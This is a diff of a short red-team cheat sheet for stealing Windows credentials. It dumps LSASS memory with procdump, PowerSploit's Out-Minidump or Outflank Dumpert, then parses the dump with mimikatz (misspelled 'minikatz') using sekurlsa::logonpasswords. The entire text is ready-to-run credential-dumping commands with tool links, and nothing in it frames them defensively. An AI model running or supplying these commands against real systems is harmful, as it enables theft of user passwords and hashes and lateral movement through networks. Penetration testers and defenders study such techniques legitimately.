@@ -1,15 +1,30 @@
 ***** Only requires elevated prompt (no SYSTEM privs)
+https://docs.microsoft.com/en-us/sysinternals/downloads/procdump
+
 procdump.exe -ma lsass.exe lsassdump
 
-***** with powershell
-Import-Module .\Out-Minidump.ps1
-Get-Process lsass | Out-Minidump
-
-***** load dump file into mimikatz
-
-log sekurlsa.log
+minikatz.exe
 sekurlsa::minidump lsassdump.dmp
 sekurlsa::logonpasswords
 
+***** with powershell
+https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1
+
+Import-Module .\Out-Minidump.ps1
 Get-Process lsass | Out-Minidump -DumpFilePath C:\temp
 
+minikatz.exe
+sekurlsa::minidump lsassdump.dmp
+sekurlsa::logonpasswords
+
+***** Outflank Dumpert***
+https://github.com/outflanknl/Dumpert
+
+rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump
+Outflank-Dumpert.exe
+
+writes output to C:\Windows\temp\dumpert.dmp
+
+minikatz.exe
+sekurlsa::minidump C:\Windows\temp\dumpert.dmp
+sekurlsa::logonpasswords
